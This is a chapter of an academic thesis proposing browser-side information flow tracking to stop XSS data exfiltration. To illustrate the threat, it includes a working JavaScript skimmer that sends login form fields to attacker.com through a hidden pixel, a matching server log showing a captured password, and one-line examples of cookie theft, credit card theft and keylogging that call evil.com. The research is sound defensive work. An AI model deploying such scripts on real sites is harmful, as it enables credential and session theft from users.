\chapter{Defending Against Information Leaks}\label{ch:defense}

\begin{comment}
on using information flow techniques which can detect and prevent malicious behavior of executing programs.

- change language semantics
- augment memory model with labels
- detect and intercept xss
- prevent information leakage

Combine earlier approaches into a universal and comprehensive framework
- decentralized labeling
- support more flexible policies
- hybrid static/dynamic analysis
- dynamically track information flow
- pervasively works at the lowest layer
\end{comment}

Publications tracking security vulnerabilities~\cite{owasp, cwe, whitehat} continually advocate the use of sanitization routines for combating the string inclusion problem, demonstrating that the architectural problems underlying XSS attacks have not been solved.
Despite this recommendation, XSS consistently ranks very high on the annual lists of those same web application vulnerability studies~\cite{owasp, cwe, whitehat}.
Code injection attacks illustrate two fundamental principals of web security: (1) the application should not trust user generated, and (2) the application should not necessarily trust data stored on its own servers.
The second principal concerns us most, because it internalizes the threat.

Visitors to a web service do not have any verification or proof that the mashup performs only the expected or advertised task and does not steal data.
Hijacking just one commonly included script compromises the privacy of many web users~\cite{nikiforakis.etal+12} and gives the attacker immediate access to their information.
Previous experience with CrowdFlow~\cite{kerschbaumer.etal+13} corroborates the scale of the problem by showing that some pages within the Alexa Top 500~\cite{alexa} contain JavaScript values sent across domain boundaries that had been influenced by code originating from up to six different domains.
The historically notable examples in \autoref{sec:attack-xss-uses} also demonstrate the relative ease with which a clever user can control the actions taken by millions of other browsers.

Many of the victims of XSS have their browser simultaneously logged in to other more sensitive services (such as email, shopping, banking or brokerage accounts).
For most users, the web browser stores more personally identifying information about individual habits and interests than any other single application.
Additionally, web browsers also conveniently store login credentials for banking sites, webmail services, and many shopping sites, as well as form information containing their user's real name, address, phone number, and credit card numbers.
The potential for harvesting of sensitive user credentials via a forum post or spam email with malicious JavaScript presents a serious threat to the privacy of the average web user.

%Because servers deliver JavaScript as source text, most content and third-party library providers compact their code by automatically shortening variable names, removing all extra whitespace as well as line breaks so the code becomes as small as possible.
%This practice shortens the transfer time for loading JavaScript, but has the side-effect of obfuscating the source code.
%Despite the fact that including this code into a web application grants it access to the application's internals, web authors remain unlikely to audit third-party code for security vulnerabilities, especially when compressed.
%Consequently, dynamic textual inclusion remains an open and prevalent channel through which attackers can inject malicious code into a web application.

The mechanisms of XSS injection (\autoref{sec:attack-xss-types}) make the origin of the attack code equivalent to the origin of the web application itself, as governed by Same Origin Policy.
Consequently, the SOP cannot prevent information exfiltration after code injection has occurred.
However, preventing the injection by analyzing source text remains difficult for architectural reasons (\autoref{sec:attack-web-architecture}).
Additional security requires a more powerful, behavior-focused mechanism, such as information flow tracking.
We propose adopting information flow as an alternative, less brittle, approach for preventing the malicious duplication of data by third-party scripts loaded by the application.

\section{The Attacker's Threat}\label{sec:defense-attackers-threat}

This work assumes that the web application's filter defenses remain incomplete and non-exhaustive, despite the best efforts of the web application designers.
We grant the attacker the ability to bypass application filters and store malicious JavaScript in the web site's database.
The server code responsible for assembling pages trusts the database content and includes the code in pages viewable by innocent users of the application.

Having already exploited an XSS vulnerability to inject code in the developer's web application, the attacker supplies a JavaScript payload via an included advertisement, mashup content, or library, or via an unsanitized form or URL (\autoref{ch:attack}).
Although we limit the attack payload to JavaScript, we assume that its origin does not make it distinguishable from the rest of the web application's JavaScript codebase.
The attacker has public-facing knowledge about the application, obtained by visiting and interacting with the application and observing its behavior, which they can use to craft the payload.
The attacker practices only code injection techniques and does not resort to packet sniffing, network interception, or control of the application servers.
We also assume that the attacker controls their own web server that acts as a harvesting point for stolen data.

These aforementioned abilities combine to pose an information leak threat.
Any code injected into the web application executes with the full abilities of that application.
The attacker crafts the payload to surreptitiously communicate application sensitive information, such as personal login credentials, text the user enters into forms, or anything the web application displays to a visitor to their data-harvesting web server.
The pilfered information leaves the application as part of a resource request submitted to the attacker controlled server, circumventing the Same Origin Policy.
The attacker then harvests the exfiltrated data by inspecting the resource request logs of their own server.

\subsection{Sample Attack: Stealing Form Data}\label{sec:defense-stealingformdata}

An HTML form provides a page with data entry fields that allow a user to enter text such as a username and password.
Once a user submits the form, the browser sends the data to the server.
Virtually all web applications rely on login fields to authenticate their users.
If an attacker manages to inject code into a web application that contains a login form, the attacker's script can read a user's credentials and send them to an attacker-controlled server.
Later, the attacker may use the stolen credentials to impersonate users of the web service.

\lstset{
  label=list:fieldinfo,
  caption={Example attack code that steals login form data from a web page.}
}
\begin{jscode}
// place hidden image on the page
var pixel = "<img src=\"http://www.attacker.com/pixel.png\"" +
            "id=\"pixel\" />";
document.write(pixel);

function stealFormData(type, value) {
  var payload = "url=" + document.domain + "&" + type + "=" + value;
  document.getElementById("pixel").src =
      "http://www.attacker.com/pixel.png?" + payload;
}

// add stealFormData to all forms on page
for (var i = 0; i < document.forms.length; i++) {
  for (var j = 0; j < document.forms[i].elements.length; j++) {
    var elem = document.forms[i].elements[j];
    elem.addEventListener("blur", // triggered when element loses focus
           function() { stealFormData(this.type, this.value) }, false);
  }
}
\end{jscode}

\autoref{list:fieldinfo} shows exploit code an attacker might use to steal credentials from the login form of a web page.
The attack script first loads an image (\codeline{2}) supplied by a server under the attacker's control.
The attacker designs the image to avoid perceptible changes in page layout.
Few users will notice the placement of a single transparent pixel, but the attacker can use the GET request as a channel to steal confidential page data whenever the image is reloaded from the server.

The attacker knows users will fill out the form and registers (\codelines{14}{15}) a \code{blur}-event handler on all forms elements on the page.
When a form element loses focus it triggers a call to the \code{blur}-event handler.
The handler, \code{stealFormData} defined on \codeline{5}, first encodes information about the page domain and contents of the form element which triggered the event in the \code{payload} variable.
Then it updates the \code{src} attribute of the image with a URL containing the payload.
This update causes the browser to automatically reload the image, sending the sensitive information in the URL of the image request.

\lstset{
  label={list:serverlogs},
  caption={Log of \code{attacker.com} from the running example.}
}
\begin{jscode}
[01/Jan/2014:21:34:10] "GET /pixel.png?url=www.bank.com&text=alice HTTP/1.1"
[01/Jan/2014:21:34:12] "GET /pixel.png?url=www.bank.com&password=bob69 HTTP/1.1"
\end{jscode}

By inspecting the server request logs, the attacker can reassemble the captured form data.
\autoref{list:serverlogs} contains some example entries of image requests.
The attacker can clearly identify a user of \code{www.bank.com} with login `\code{alice}' having the password `\code{bob69}'.

\section{The Developer's Response}\label{sec:developers-response}

Knowing that the origin of attacker code does \emph{not} reliably distinguish it from the rest of the web application, this work focuses on the malicious \emph{behavior} of any code within the application.
Indeed, an information leak might be the unintended result of a careless or uninformed application developer, rather than an attacker.

In response to this threat, a security-conscious developer tests their application in a web browser that monitors the flows of information within the application.
To assist the developer in focusing their debugging attention on specific pieces of sensitive data within the application, we use an information flow framework that presents a labeling system as a first-class language construct within the browser-hosted JavaScript engine.
Without leaving JavaScript, the developer creates a label and applies it to the sensitive data, tagging it with a unique identifier.
The underlying information flow engine tracks the interaction of application (and injected) code with this sensitive data, ensuring that exfiltration code does not drop the label.

The first-class labeling feature also enables the developer to write a network monitor using JavaScript, so that they may observe a leak of information tagged as sensitive.
The developer implements their own network monitor logic to inspect the labels of all resource requests, which facilitates the detection and debugging of an information leak and implements an application specific information flow policy.

\subsection{Provided Security}\label{sec:defense-providedsecurity}

%The web browser running \JitFlow\ advanced significantly beyond the capabilities offered when evaluated with only the interpreter \FlowCore.
The information flow engine integrates with the web browser framework to protect against several information theft attacks, including, but not limited to:

\begin{description}

\item[Sensitive Data Theft Attacks:] \hfill \\
By sending a GET request to a server under the attacker's control, the attacker can steal information in the URL of an image request:

\begin{snippet}
img.src = "evil.com/pic.png?" + credit_card_number;
\end{snippet}

The attacker uses the request for the image as a channel to steal the user's credit card number as a payload in the GET request.
Merely changing the URL targeted by the \code{src} attribute of an image triggers loading of the image.

\item[Keylogging Attacks:] \hfill \\
Similarly, to steal a username and password combination, an attacker might craft code that logs keystrokes by registering an event handler:

\begin{snippet}
document.onkeypress = listenerFunction;
\end{snippet}

The listener function records the user's keystrokes and sends them to the attacker's server through an HTTP request.

\item[Cookie Stealing Attacks:] \hfill \\
Furthermore, if a script can access cookies, then an attacker can also steal a session cookie between the browser and an honest site by concatenating the \code{document.cookie} to the URL of the image request.

\begin{snippet}
img.src = "evil.com/pic.png?" + document.cookie;
\end{snippet}

The stolen cookie allows the attacker to obtain credentials that permit impersonating the user or hijacking their session.

\end{description}

\subsection{Preventing Malicious Action}

Based on the observation that the execution of code within the JavaScript VM and browser sandbox can cause no harm as long as it does not generate external signals (such as network traffic), we advocate allowing the malicious code to execute under a modified interpreter that tracks the information dependence of runtime values.
Rather than rely entirely on string filtration that attempts to identify and reject attacker supplied code, this approach tracks the flow of information through a chain of JavaScript program values.
The web browser categorizes JavaScript code as malicious only when it attempts to communicate sensitive information to an unauthorized third party.
At that point, a network hook enforcing application-specific information flow policies in the browser intervenes and prevents the information leak.
